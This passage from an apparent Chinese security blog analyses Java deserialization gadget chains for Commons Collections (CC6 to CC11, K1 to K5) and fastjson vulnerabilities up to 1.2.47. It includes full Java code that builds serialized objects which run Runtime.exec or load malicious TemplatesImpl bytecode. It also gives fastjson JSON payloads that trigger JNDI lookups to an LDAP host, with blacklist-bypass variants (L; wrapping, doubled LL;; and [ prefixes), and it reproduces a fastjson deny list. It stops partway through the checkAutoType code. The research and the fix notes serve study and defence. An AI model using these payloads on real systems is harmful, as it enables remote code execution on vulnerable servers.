java.util.HashMap.hash()        TiedMapEntry.hashCode()        TiedMapEntry.getValue()        LazyMap.get()        ChainedTransformer.transform()        ConstantTransformer.transform()        InvokerTransformer.transform()        Method.invoke()        Class.getMethod()        InvokerTransformer.transform()        Method.invoke()        Runtime.getRuntime()        InvokerTransformer.transform()        Method.invoke()        Runtime.exec()\n\n分析由于 5 有环境版本的要求，这个相当于是 5 的改进，不依赖版本了。利用链原理 TiedMapEntry 的 hashcode方法可以结合 HashMap 利用:\njavapublic int hashCode()&#123;        Object value=getValue();        return(getKey()==null?0:getKey().hashCode())^        (value==null?0:value.hashCode());        &#125;\n\nysoserial 中这个 gadget 实现的很复杂，实际上可以简化 参考，完整链手写如下:\njavafinal String[]execArgs=new String[]&#123;&quot;open /Applications/Calculator.app&quot;&#125;;final Transformer[]transformers=new Transformer[]&#123;        new ConstantTransformer(Runtime.class),        new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;        String.class,Class[].class&#125;,new Object[]&#123;        &quot;getRuntime&quot;,new Class[0]&#125;),        new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;        Object.class,Object[].class&#125;,new Object[]&#123;        null,new Object[0]&#125;),        new InvokerTransformer(&quot;exec&quot;,        new Class[]&#123;String.class&#125;,execArgs),        new ConstantTransformer(new HashSet&lt;String&gt;())&#125;;        ChainedTransformer inertChain=new ChainedTransformer(new Transformer[]&#123;&#125;);        HashMap&lt;String, String&gt; innerMap=new HashMap&lt;String, String&gt;();        Map m=LazyMap.decorate(innerMap,inertChain);        Map outerMap=new HashMap();        TiedMapEntry tied=new TiedMapEntry(m,&quot;v&quot;);        outerMap.put(tied,&quot;t&quot;);// 这个很关键        innerMap.clear();// 将真正的 transformers 设置, 避免上面 put 时 payload 时就执行了        Field field=inertChain.getClass().getDeclaredField(&quot;iTransformers&quot;);        field.setAccessible(true);        field.set(inertChain,transformers);        ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));        out.writeObject(outerMap);        out.close();\n\n这里有个细节很关键，就是 innerMap.clear() 这句，这并不是为了清空下缓存，而是如果没有这一句在反序列化时就不会触发了，原因是LazyMap 中有这样的写法:\njavapublic Object get(Object key)&#123;        // create value for key if key is not currently in the map        if(map.containsKey(key)==false)&#123;        Object value=factory.transform(key);        map.put(key,value);        return value;        &#125;        return map.get(key);        &#125;\n\n如果没有 clear，那么反序列化后的 map 是直接包含了 key 的，这里的 factory.transform 就中断了。为了方便使用，我把这条简化后的链命名为了K3，见后面的部分。\nCommonsCollections7依赖\nCommonsCollections &lt;= 3.2.1\n\n利用链textjava.util.Hashtable.readObject        java.util.Hashtable.reconstitutionPut        java.util.AbstractMap.equals        LazyMap.get()        ChainedTransformer.transform()        ConstantTransformer.transform()        InvokerTransformer.transform()        Method.invoke()        Class.getMethod()        InvokerTransformer.transform()        Method.invoke()        Runtime.getRuntime()        InvokerTransformer.transform()        Method.invoke()        Runtime.exec()\n\n分析这个原理基于三个小技巧:\n\nyy 和 zZ 这两个字符串的 hashcode() 是一样的\n当向 hashtable 或 hashmap 中put时，如果 key 是一个 map，hashcode 的计算方法是这种方式:\n\njava// java.util.AbstractMap#hashCodepublic int hashCode()&#123;        int h=0;        Iterator&lt;Entry&lt;K, V&gt;&gt;i=entrySet().iterator();        while(i.hasNext())        h+=i.next().hashCode();        return h;        &#125;\n\n\n当 key 为 map 类型并且发生了 hashcode 碰撞，会做深层次的比较:\n\njava// java.util.AbstractMap#equalspublic boolean equals(Object o)&#123;// ...        try&#123;        Iterator&lt;Entry&lt;K, V&gt;&gt;i=entrySet().iterator();        while(i.hasNext())&#123;        Entry&lt;K, V&gt; e=i.next();        K key=e.getKey();        V value=e.getValue();        if(value==null)&#123;        if(!(m.get(key)==null&amp;&amp;m.containsKey(key)))        return false;        &#125;else&#123;        // 这里会触发 lazymap 的 transform        if(!value.equals(m.get(key)))        return false;        &#125;        &#125;// ...\n\njavaMap innerMap1=new HashMap();        Map innerMap2=new HashMap();// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject        Map lazyMap1=LazyMap.decorate(innerMap1,inertChain);        lazyMap1.put(&quot;yy&quot;,1);        Map lazyMap2=LazyMap.decorate(innerMap2,inertChain);        lazyMap2.put(&quot;zZ&quot;,1);// Use the colliding Maps as keys in Hashtable        Hashtable hashtable=new Hashtable();        hashtable.put(lazyMap1,1);        hashtable.put(lazyMap2,2);        Field i=inertChain.getClass().getDeclaredField(&quot;iTransformers&quot;);        i.setAccessible(true);        i.set(inertChain,transformers);// 和 6 中 innerMap.clear() 一个道理，需要清除 put 时的缓存，这样反序列化时才会产生冲突并触发 lazymap.get        lazyMap2.remove(&quot;yy&quot;);// then write hashtable to file\n\nCommonsCollections8依赖\nCommonsCollections == 4.0\n\n利用链javaorg.apache.commons.collections4.bag.TreeBag.readObject        org.apache.commons.collections4.bag.AbstractMapBag.doReadObject        java.util.TreeMap.put        java.util.TreeMap.compare        org.apache.commons.collections4.comparators.TransformingComparator.compare        org.apache.commons.collections4.functors.InvokerTransformer.transform        java.lang.reflect.Method.invoke        sun.reflect.DelegatingMethodAccessorImpl.invoke        sun.reflect.NativeMethodAccessorImpl.invoke        sun.reflect.NativeMethodAccessorImpl.invoke0        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer        ... (TemplatesImpl gadget)        java.lang.Runtime.exec\n\n分析由 navalorenzo师傅 提交\n当使用comp对象对两个元素进行compare时，就会调用两个元素的newTransformer方法\n构造comp对象，只要调用comp的compare(templates对象)就会造成命令执行，反射修改属性 iMethodName 为 newTransformer 以此触发反序列化\njavaObject                 tpl         = Gadgets.createTemplatesImpl(type, param);InvokerTransformer     transformer = new InvokerTransformer(&quot;toString&quot;, new Class[0], new Object[0]);TransformingComparator comp        = new TransformingComparator((Transformer) transformer);TreeBag                tree        = new TreeBag((Comparator) comp);tree.add(tpl);Reflections.setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);return tree;\n\nCommonsCollections9依赖\nCommonsCollections:3.2\n\n利用链ObjectInputStream.readObject()  AnnotationInvocationHandler.readObject()    Map(Proxy).entrySet()      AnnotationInvocationHandler.invoke()        DefaultedMap.get()          ChainedTransformer.transform()              ConstantTransformer.transform()              InvokerTransformer.transform()                Method.invoke()                  Class.getMethod()              InvokerTransformer.transform()                Method.invoke()                  Runtime.getRuntime()              InvokerTransformer.transform()                Method.invoke()                  Runtime.exec()\n\n分析由 梅子酒师傅 提交\n主要利用的是 CommonsCollections:3.2 版本新增的 DefaultedMap 来代替 LazyMap ，因为这两个Map有同样的get函数可以被利用，在构建 TiedMapEntry 类型对象，调用它的 hashCode 方法导致代码执行\njavaString                        command            = param[0];String[]                      execArgs           = &#123;command&#125;;Class                         c                  = (execArgs.length &gt; 1) ? String[].class : String.class;ChainedTransformer            chainedTransformer = new ChainedTransformer(new Transformer[]&#123;(Transformer) new ConstantTransformer(Integer.valueOf(1))&#125;);Transformer[]                 transformers       = TransformerUtil.makeTransformer(command);Map&lt;Object, Object&gt;           innerMap           = new HashMap&lt;Object, Object&gt;();Map                           defaultedmap       = DefaultedMap.decorate(innerMap, (Transformer) chainedTransformer);TiedMapEntry                  entry              = new TiedMapEntry(defaultedmap, &quot;nu1r&quot;);BadAttributeValueExpException val                = new BadAttributeValueExpException(null);Reflections.setFieldValue(val, &quot;val&quot;, entry);Reflections.setFieldValue(chainedTransformer, &quot;iTransformers&quot;, transformers);return val;\n\nCommonsCollections10依赖\nCommonsCollections &lt;= 3.2.1\n\n利用链textHashtable.readObject()    Hashtable.reconstitutionPut    key.hashCode() =&gt; TiedMapEntry.hashCode()    TiedMapEntry.getValue    TiedMapEntry.map.get() =&gt; LazyMap.get()    factory.transform() =&gt; ChainedTransformer.transform()    Runtime.getRuntime().exec()\n\n分析先是HashSet反序列化 -&gt; 对元素entry计算hash -&gt; lazyMap调用get方法 -&gt; 通过InvokerTransformer调用templates的newTransformer -&gt; 加载命令执行的静态代码块\njavafinal Object templates = Gadgets.createTemplatesImpl(type, param);// 使用 InstantiateFactory 代替 InstantiateTransformerInstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class, new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);// 先放一个无关键要的 TransformerConstantTransformer constantTransformer = new ConstantTransformer(1);Map                 innerMap            = new HashMap();LazyMap             outerMap            = (LazyMap) LazyMap.decorate(innerMap, constantTransformer);TiedMapEntry        tme                 = new TiedMapEntry(outerMap, &quot;nu1r&quot;);Map                 expMap              = new HashMap();expMap.put(tme, &quot;nu2r&quot;);setFieldValue(outerMap, &quot;factory&quot;, factoryTransformer);outerMap.remove(&quot;nu1r&quot;);return expMap;\n\nCommonsCollections11依赖\nCommonsCollections 3.1-3.2.1\n\n利用链java.io.ObjectInputStream.readobject()    java.util.HashSet.readobject()        java.util.HashMap.put()        java.util.HashMap.hash()            org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()            org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()                org.apache.commons.collections.map.LazyMap.get()                    org.apache.commons.collections,functors.InvokerTransformer,transform()                    java.lang.reflect.Method.invoke()                        ...templates gadgets...                            java.lang.Runtime.exec()\n\n分析在 cc11 中最后是利用 InvokerTransformer 调用 TemplatesImpl#newTransformer 加载恶意字节码来实现的触发的，其他的和CC6差不多。\njavapublic Object getObject(PayloadType type, String... param) throws Exception &#123;        Object                  templates          = Gadgets.createTemplatesImpl(type, param);        InvokerTransformer      invokerTransformer = new InvokerTransformer(&quot;connect&quot;, null, null);        HashMap&lt;Object, Object&gt; map                = new HashMap&lt;&gt;();        Map&lt;Object, Object&gt;     lazyMap            = LazyMap.decorate(map, new ConstantTransformer(1));        TiedMapEntry            tiedMapEntry       = new TiedMapEntry(lazyMap, templates);        HashMap&lt;Object, Object&gt; expMap             = new HashMap&lt;&gt;();        expMap.put(tiedMapEntry, &quot;nu1r&quot;);        lazyMap.remove(templates);        Reflections.setFieldValue(lazyMap, &quot;factory&quot;, invokerTransformer);        return expMap;        &#125;\n\nCommonsCollectionsK1,K2依赖\nK1: CommonsCollections &lt;= 3.2.1\nK2: CommonsCollections == 4.0\n\n利用链HashMap.readObject        TiedMapEntry.hashCode        TiedMapEntry.getValue        LazyMap.decorate        InvokerTransformer        templates...\n\n分析这是我在做 shiro 检测时被迫组合出的一条利用链，这条链虽然是新瓶装旧酒——前半段类似 6，后半段类似2，但完全避免了 ChainedTransformer 的使用且仅依赖于 CommonsCollections，最终效果是可以直接在 shiro 1.2.24 的环境中使用。\njavaObject tpl=Gadgets.createTemplatesImpl(&quot;cmd&quot;);        InvokerTransformer transformer=new InvokerTransformer(&quot;toString&quot;,new Class[0],new Object[0]);        HashMap&lt;String, String&gt; innerMap=new HashMap&lt;String, String&gt;();        Map m=LazyMap.decorate(innerMap,transformer);        Map outerMap=new HashMap();        TiedMapEntry tied=new TiedMapEntry(m,tpl);        outerMap.put(tied,&quot;t&quot;);// 这个很关键        innerMap.clear();// 将真正的 transformers 设置, 避免上面 put 时 payload 时就执行了        Field field=transformer.getClass().getDeclaredField(&quot;iMethodName&quot;);        field.setAccessible(true);        field.set(transformer,&quot;newTransformer&quot;);        ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));        out.writeObject(outerMap);        out.close();\n\nK2 与 K1 的差别，仅仅是将 lazyMap 改为了 4.0 中的写法，不再赘述。\nCommonsCollectionsK3,K4依赖\nK1: CommonsCollections &lt;= 3.2.1\nK2: CommonsCollections == 4.0\n\n利用链textjava.util.HashMap.readObject()      java.util.HashMap.hash()      TiedMapEntry.hashCode()      TiedMapEntry.getValue()      LazyMap.get()      ChainedTransformer.transform()\n\n分析K3 这个链其实就是我上面写的 6，ysoserial 中的写法有些啰嗦，所以单独抽出来重新命名了一下。K4 就是 K3 的 4.0 适配版，不再赘述。\nCommonsCollectionsK5依赖\nCommonsCollections == 4.0\n\n利用链textjava.util.Hashtable.readObject        java.util.Hashtable.reconstitutionPut        java.util.AbstractMap.equals        LazyMap.get()        ChainedTransformer.transform()        ConstantTransformer.transform()        InvokerTransformer.transform()        Method.invoke()        Class.getMethod()        InvokerTransformer.transform()        Method.invoke()        Runtime.getRuntime()        InvokerTransformer.transform()        Method.invoke()        Runtime.exec()\n\n分析CC7的升级版，不在赘述。\n修复方式3.2.1在 3.2.2 中对几个高危反序列化点都加了检查\njavaprivate void readObject(ObjectInputStream is)throws ClassNotFoundException,IOException&#123;        FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);        is.defaultReadObject();        &#125;// FunctorUtils.checkUnsafeSerializationstatic void checkUnsafeSerialization(Class clazz)&#123;        String unsafeSerializableProperty;        try&#123;        unsafeSerializableProperty=        (String)AccessController.doPrivileged(new PrivilegedAction()&#123;public Object run()&#123;        return System.getProperty(UNSAFE_SERIALIZABLE_PROPERTY);        &#125;        &#125;);        &#125;catch(SecurityException ex)&#123;        unsafeSerializableProperty=null;        &#125;        if(!&quot;true&quot;.equalsIgnoreCase(unsafeSerializableProperty))&#123;        throw new UnsupportedOperationException(        &quot;Serialization support for &quot;+clazz.getName()+&quot; is disabled for security reasons. &quot;+        &quot;To enable it set system property &#x27;&quot;+UNSAFE_SERIALIZABLE_PROPERTY+&quot;&#x27; to &#x27;true&#x27;, &quot;+        &quot;but you must ensure that your application does not de-serialize objects from untrusted sources.&quot;);        &#125;        &#125;\n\n没有使用黑名单策略，如果配置里没有启用，反序列化功能就会被完全禁用掉。\n4.0直接把一些敏感类的 Serializable 接口去掉了..\n\nWARNING: from v4.1 onwards this class will not be serializable anymore in order to prevent potential remotecode execution exploits. Please refer to COLLECTIONS-580\nfor more details.*\n\nAnnotationInvocationHandler除了对 CommonsCollections 本身的修复，JDK 对 AnnotationInvocationHandler 这个非常好用的类也做了些防护，在 8u71 中, 对readObject 做了一些修改\njava// sun.reflect.annotation.AnnotationInvocationHandler#readObjectprivate void readObject(ObjectInputStream var1)throws IOException,ClassNotFoundException&#123;        GetField var2=var1.readFields();        Class var3=(Class)var2.get(&quot;type&quot;,(Object)null);        Map var4=(Map)var2.get(&quot;memberValues&quot;,(Object)null);        AnnotationType var5=null;        try&#123;        var5=AnnotationType.getInstance(var3);        &#125;catch(IllegalArgumentException var13)&#123;        throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);        &#125;        Map var6=var5.memberTypes();        LinkedHashMap var7=new LinkedHashMap();        String var10;        Object var11;        for(Iterator var8=var4.entrySet().iterator();var8.hasNext();var7.put(var10,var11))&#123;        Entry var9=(Entry)var8.next();        var10=(String)var9.getKey();        var11=null;        Class var12=(Class)var6.get(var10);        if(var12!=null)&#123;        var11=var9.getValue();        if(!var12.isInstance(var11)&amp;&amp;!(var11 instanceof ExceptionProxy))&#123;        var11=(new AnnotationTypeMismatchExceptionProxy(var11.getClass()+&quot;[&quot;+var11+&quot;]&quot;)).setMember((Method)var5.members().get(var10));        &#125;        &#125;        &#125;        AnnotationInvocationHandler.UnsafeAccessor.setType(this,var3);        AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this,var7);        &#125;\n\n注意到最终反序列化出的 memberValues 已经不是我们原始的 lazyMap 了，而是一个新的 LinkedHashMap，这样所有 AnnotationInvocationHandler 搭配 lazymap的利用链全都失效了。这也是我不太喜欢这些利用链的原因，它们不仅有库的依赖，还有环境的依赖。那么哪些是高价值利用链，哪些是没有环境依赖就能打的，我们来总结一下。\n总结\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","categories":["WEB"],"tags":["java","反序列化","CC"]},{"title":"FastJson漏洞浅析","url":"/2022/09/27/FastJson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"Tips: 想要跟着复现的，从这里下载Fastjson\nFastjson 概述Fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean，Fastjson不但性能好而且API非常简单易用，所以用户基数巨大，价值也可想而知。\nFastjson 使用使用 Fastjson 无非是将类转为 json 字符串或解析 json 转为 JavaBean。\n将类转为 json在这里我们最常用的方法就是 JSON.toJSONString() ，该方法有若干重载方法，带有不同的参数，其中常用的包括以下几个：\n序列化特性：com.alibaba.fastjson.serializer.SerializerFeature ，可以通过设置多个特性到 FastjsonConfig 中全局使用，也可以在使用具体方法中指定特性。\n序列化过滤器：com.alibaba.fastjson.serializer.SerializeFilter ，这是一个接口，通过配置它的子接口或者实现类就可以以扩展编程的方式实现定制序列化。\n序列化时的配置：com.alibaba.fastjson.serializer.SerializeConfig ，可以添加特点类型自定义的序列化配置。\n将 json 反序列化为类将 json 数据反序列化时常使用的方法为parse()、parseObject()、parseArray()，这三个方法也均包含若干重载方法，带有不同参数：\n\n反序列化特性：com.alibaba.fastjson.parser.Feature。\n\n类的类型：java.lang.reflect.Type，用来执行反序列化类的类型。\n\n处理泛型反序列化：com.alibaba.fastjson.TypeReference。\n\n编程扩展定制反序列化：com.alibaba.fastjson.parser.deserializer.ParseProcess，例如ExtraProcessor 用于处理多余的字段，ExtraTypeProvider 用于处理多余字段时提供类型信息。\n\n\n这里列举一些 fastjson 功能要点：\n\n使用 JSON.parse(jsonString) 和 JSON.parseObject(jsonString, Target.class)，两者调用链一致，前者会在 jsonString 中解析字符串获取 @type 指定的类，后者则会直接使用参数中的class。\n\nfastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter/setter 方法，其中 getter 方法需满足条件：方法名长于4、不是静态方法、以 get 开头且第4位是大写字母、方法不能有参数传入、继承自 Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong、此属性没有 setter 方法；setter 方法需满足条件：方法名长于 4，以 set 开头且第4位是大写字母、非静态方法、返回类型为 void 或当前类、参数个数为 1 个。具体逻辑在 com.alibaba.fastjson.util.JavaBeanInfo.build() 中。\n\n使用 JSON.parseObject(jsonString) 将会返回 JSONObject 对象，且类中的所有 getter 与 setter 都被调用。\n\n如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 Feature.SupportNonPublicField 参数。\n\nfastjson 在为类属性寻找 get&#x2F;set 方法时，调用函数com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch() 方法，会忽略 _|- 字符串，也就是说哪怕你的字段名叫 _a_g_e_，getter 方法为 getAge()，fastjson 也可以找得到，在 1.2.36 版本及后续版本还可以支持同时使用 _ 和 - 进行组合混淆。\n\nfastjson 在反序列化时，如果 Field 类型为 byte[]，将会调用com.alibaba.fastjson.parser.JSONScanner#bytesValue 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。\n\n\n漏洞分析fastjson-1.2.24TemplatesImpl 反序列化在2017年3月15日，fastjson官方主动爆出在 1.2.24 及之前版本存在远程代码执行高危安全漏洞。\n\n影响版本：fastjson &lt;= 1.2.24 描述：fastjson 默认使用 @type 指定反序列化任意类，攻击者可以通过在 Java 常见环境中寻找能够构造恶意类的方法，通过反序列化的过程中调用的 getter&#x2F;setter 方法，以及目标成员变量的注入来达到传参的目的，最终形成恶意调用链。此漏洞开启了 fastjson 反序列化漏洞的大门，为安全研究人员提供了新的思路。\n\n漏洞点位于 TemplatesImpl 类中， com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl。\n\n实现了 Serializable 接口，因此它可以被序列化。\n\n首先我们注意到该类中存在一个成员属性 _class，是一个 Class 类型的数组，数组里下标为_transletIndex 的类会在 getTransletInstance() 方法中使用 newInstance() 实例化。\n正则 getTransletInstance 可发现，newTransformer()中调用了 getTransletInstance()\n\n在正则一下 newTransformer ,发现 getOutputProperties() 调用了 newTransformer()\n\n就有了如下调用\ntextgetOutputProperties()    --&gt; newTransformer()        --&gt; getTransletInstance()\n\n\n而 getOutputProperties() 方法就是类成员变量 _outputProperties 的 getter 方法。\n在看一下 _class 中的类是否可控\n\n发现在 readObject、构造方法以及 defineTransletClasses() 3处有赋值的动作。\n其中 defineTransletClasses() 在 getTransletInstance() 中，如果 _class 不为空即会被调用\n\n分析一下 defineTransletClasses() 的逻辑：\n\n\n逻辑大概就是 _bytecodes 不为空，接着就会调用自定义的 ClassLoader 去加载 _bytecodes 中的 byte[] 。而 _bytecodes 也是该类的成员属性。\n而如果这个类的父类为 ABSTRACT_TRANSLET 也就是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，就会将类成员属性的，_transletIndex 设置为当前循环中的标记位，而如果是第一次调用，就是_class[0]。如果父类不是这个类，将会抛出异常。\n分析到这里一条完整的漏洞调用链就出来了，payload要求如下：\n\n构造一个 TemplatesImpl 类的反序列化字符串，其中 _bytecodes 是我们构造的恶意类的类字节码，这个类的父类是 AbstractTranslet，最终这个类会被加载并使用 newInstance() 实例化。\n\n在反序列化过程中，由于getter方法 getOutputProperties() ，满足条件，将会被 fastjson 调用\n\n为了满足漏洞点触发之前不报异常及退出，我们还需要满足 _name 不为 null ，_tfactory 不为 null 。\n\n由于部分需要我们更改的私有变量没有 setter 方法，需要使用 Feature.SupportNonPublicField 参数。\n\n\n完整调用流程\ngetOutputProperties()     -&gt; newTransformer()         -&gt; getTransletInstance()             -&gt; defineTransletClasses() / EvilClass.newInstance()\n\nPayload\njson&#123;    &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,    &quot;_bytecodes&quot;: [&quot;Base64MaliceClass&quot;],    &quot;_name&quot;: &quot;nu1r&quot;,    &quot;_tfactory&quot;: &#123;&#125;,    &quot;_outputProperties&quot;: &#123;&#125;&#125;\n\nJdbcRowSetImpl 反序列化JdbcRowSetImpl 类位于 com.sun.rowset.JdbcRowSetImpl ，这条漏洞利用链比较好理解，是 javax.naming.InitialContext#lookup() 参数可控导致的 JNDI 注入。\n入口点位于 setAutoCommit() 方法，在 this.conn 为空时，将会调用 this.connect() 方法。\n\n进入connect()方法，方法里调用了 javax.naming.InitialContext#lookup() 方法，参数从成员变量 dataSource 中获取。\n\n综上，Payload为\njson&#123;    &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,    &quot;dataSourceName&quot;:&quot;ldap://0.0.0.0:1389/CC6&quot;,    &quot;autoCommit&quot;:true&#125;\n\nfastjson-1.2.25在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制，默认情况下 autoTypeSupport 关闭，不能直接反序列化任意类，而打开 AutoType 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口。\n\n影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.41 描述：作者通过为危险功能添加开关，并提供黑白名单两种方式进行安全防护，其实已经是相当完整的防护思路，而且作者已经意识到黑名单类将会无穷无尽，仅仅通过维护列表来防止反序列化漏洞并非最好的办法。而且靠用户自己来关注安全信息去维护也不现实。\n\n安全更新主要集中在 com.alibaba.fastjson.parser.ParserConfig，首先查看类上出现了几个成员变量：布尔型的 autoTypeSupport，用来标识是否开启任意类型的反序列化，并且默认关闭；字符串数组 denyList ，是反序列化类的黑名单；acceptList 是反序列化白名单。\n\n其中黑名单 denyList 为\nbshcom.mchangecom.sun.java.lang.Threadjava.net.Socketjava.rmijavax.xmlorg.apache.bcelorg.apache.commons.beanutilsorg.apache.commons.collections.Transformerorg.apache.commons.collections.functorsorg.apache.commons.collections4.comparatorsorg.apache.commons.fileuploadorg.apache.myfaces.context.servletorg.apache.tomcatorg.apache.wicket.utilorg.codehaus.groovy.runtimeorg.hibernateorg.jbossorg.mozilla.javascriptorg.python.coreorg.springframework\n\n先看一下 checkAutoType() 方法的逻辑\n\n如果开启了 autoType ，先判断类名是否在白名单中，如果在，就使用 TypeUtils.loadClass 加载，然后使用黑名单判断类名的开头，如果匹配就抛出异常。\n\n如果没开启 autoType ，则是先使用黑名单匹配，再使用白名单匹配和加载。最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了 autoType 或者 expectClass 不为空也就是指定了 Class 对象时才会调用 TypeUtils.loadClass 加载。\n\n跟进 TypeUtils.loadClass 的 loadClass ，这个类在加载目标类之前为了兼容带有描述符的类名，使用了递归调用来处理描述符中的 [、L、; 字符。\n因此就在这个位置出现了逻辑漏洞，攻击者可以使用带有描述符的类绕过黑名单的限制，而在类加载过程中，描述符还会被处理掉。因此，漏洞利用的思路就出来了：需要开启 autoType，使用以上字符来进行黑名单的绕过。\n所以构造的 payload 其实就是在之前的 payload 类名上前后加上L和;即可：\njson&#123;    &quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,    &quot;dataSourceName&quot;:&quot;ldap://0.0.0.0:1389/CC6&quot;,    &quot;autoCommit&quot;:true&#125;\n\nfastjson-1.2.42在版本 1.2.42 中，fastjson 继续延续了黑白名单的检测模式，但是将黑名单类从白名单修改为使用 HASH 的方式进行对比，这是为了防止安全研究人员根据黑名单中的类进行反向研究，用来对未更新的历史版本进行攻击。同时，作者对之前版本一直存在的使用类描述符绕过黑名单校验的问题尝试进行了修复。\n\n影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.42\n\n还是关注 com.alibaba.fastjson.parser.ParserConfig 这个类，作者将原本的明文黑名单转为使用了 Hash 黑名单，防止安全人员对其研究。\n\n并且在 checkAutoType 中加入判断，如果类的第一个字符是 L 结尾是 ;，则使用 substring 进行了去除。\n\n但是这种判断完全是徒劳的，因为在最后处理时是递归处理，因此对描述符只会进行一次删除就会再次进入判断，所以进行双写即可绕过：\njson&#123;    &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,    &quot;dataSourceName&quot;:&quot;ldap://0.0.0.0:1389/CC6&quot;,    &quot;autoCommit&quot;:true&#125;\n\nfastjson-1.2.43这个版本主要是修复上一个版本中双写绕过的问题。\n\n影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.43 描述：上有政策，下有对策。在 L、; 被进行了限制后，安全研究人员将目光转向了 [。\n\n\n可以看到用来检查的 checkAutoType 代码添加了判断，如果类名连续出现了两个 L 将会抛出异常，\n这样使用 L、; 绕过黑名单的思路就被阻挡了，但是在 loadClass 的过程中，还针对 [ 也进行了处理和递归，所以就利用 [ 来进行绕过\njson&#123;    &quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[,    &#123;&quot;dataSourceName&quot;:&quot;ldap://0.0.0.0:1389/CC6&quot;,    &quot;autoCommit&quot;:true&#125;\n\nfastjson-1.2.44这个版本主要是修复上一个版本中使用 [ 绕过黑名单防护的问题。\n\n影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.44 描述：在此版本将 [ 也进行修复了之后，由字符串处理导致的黑名单绕过也就告一段落了。\n\n\n可以看到在 checkAutoType 中添加了新的判断，如果类名以 [ 开始则直接抛出异常。\nfastjson-1.2.45在此版本爆出了一个黑名单绕过，实际上，黑名单是无穷无尽的，随着 fastjson 的版本更新，一定会有更多的黑名单爆出来，因为隔壁 jackson 都是明文黑名单的，只要隔壁一更新，大家都看到了，就会拿来看 fastjson。\n\n影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.45 描述：黑名单列表需要不断补充。\n\njson&#123;    &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,    &quot;properties&quot;:&#123;        &quot;data_source&quot;:&quot;ldap://0.0.0.0:1389/CC6&quot;    &#125;&#125;\n\nfastjson-1.2.47在 fastjson 不断迭代到 1.2.47 时，爆出了最为严重的漏洞，可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。\n\n影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.32未开启 AutoTypeSupport 影响版本：1.2.33 &lt;= fastjson &lt;= 1.2.47 描述：作者删除了一个 fastjson 的测试文件，里面包含了这次通杀漏洞的 payload。\n\n这次的绕过问题还是出现在 checkAutoType() 方法中：\njavapublic Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;  // 类名非空判断  if (typeName == null) &#123;    return null;  &#125;  // 类名长度判断，不大于128不小于3  if (typeName.length() &gt;= 128 || typeName.length() &lt; 3) &#123;    throw new JSONException(&quot;autoType is not support. &quot; + typeName);  &#125;  String className = typeName.replace(&#x27;$&#x27;, &#x27;.&#x27;);  Class&lt;?&gt; clazz = null;  final long BASIC = 0xcbf29ce484222325L; //;  final long PRIME = 0x100000001b3L;  //L  final long h1 = (BASIC ^ className.charAt(0)) * PRIME;  // 类名以 [ 开头抛出异常  if (h1 == 0xaf64164c86024f1aL) &#123; // [    throw new JSONException(&quot;autoType is not support. &quot; + typeName);  &#125;  // 类名以 L 开头以 ; 结尾抛出异常  if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) &#123;    throw new JSONException(&quot;autoType is not support. &quot; + typeName);  &#125;  final long h3 = (((((BASIC ^ className.charAt(0))          * PRIME)          ^ className.charAt(1))          * PRIME)          ^ className.charAt(2))          * PRIME;  // autoTypeSupport 为 true 时，先对比 acceptHashCodes 加载白名单项  if (autoTypeSupport || expectClass != null) &#123;    long hash = h3;    for (int i = 3; i &lt; className.length(); ++i) &#123;      hash ^= className.charAt(i);      hash *= PRIME;      if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) &#123;        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);        if (clazz != null) &#123;          return clazz;        &#125;      &#125;      // 在对比 denyHashCodes 进行黑名单匹配      // 如果黑名单有匹配并且 TypeUtils.mappings 里没有缓存这个类      // 则抛出异常      if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0 &amp;&amp; 